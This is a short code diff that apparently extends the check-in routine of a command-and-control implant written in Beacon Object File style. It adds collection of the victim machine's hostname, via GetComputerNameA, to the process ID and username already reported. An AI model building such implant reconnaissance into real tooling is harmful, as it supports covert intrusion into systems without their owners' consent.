@@ -2,6 +2,7 @@
 #include "../headers/celebi.h"
 
 WINBASEAPI DWORD KERNEL32$GetCurrentProcessId();
+WINBASEAPI BOOL KERNEL32$GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
 WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
@@ -19,5 +20,13 @@ void go(CheckinRequest *req) {
 		req->username = username;
 	} else {
 		KERNEL32$VirtualFree(username, 0, MEM_RELEASE);
+	}
+	
+	char *hostname = KERNEL32$VirtualAlloc(0, 256, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+	result = KERNEL32$GetComputerNameA(hostname, &len);
+	if (result == TRUE) {
+		req->hostname = hostname;
+	} else {
+		KERNEL32$VirtualFree(hostname, 0, MEM_RELEASE);
 	}
 }
